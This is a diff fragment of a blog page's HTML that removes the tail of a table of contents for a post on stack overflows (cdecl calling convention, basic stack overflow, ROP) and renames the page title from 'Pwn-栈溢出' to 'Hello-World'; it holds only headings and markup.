href="#cdecl%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A-%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BB%8E%E5%8F%B3%E5%BE%80%E5%B7%A6%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%85%A5%E6%A0%88-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%80%85%E8%B4%9F%E8%B4%A3%E6%B8%85%E9%99%A4%E6%A0%88%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%80%BC%E5%9C%A8EAX%E4%B8%AD"><span class="toc-text">cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%93%8D%E4%BD%9C"><span class="toc-text">基本的栈溢出操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li></ol>
-    </div>
-  </section>
-
 
   
 
@@ -799,7 +646,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="Pwn-栈溢出";
+  pdata.postTitle="Hello-World";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
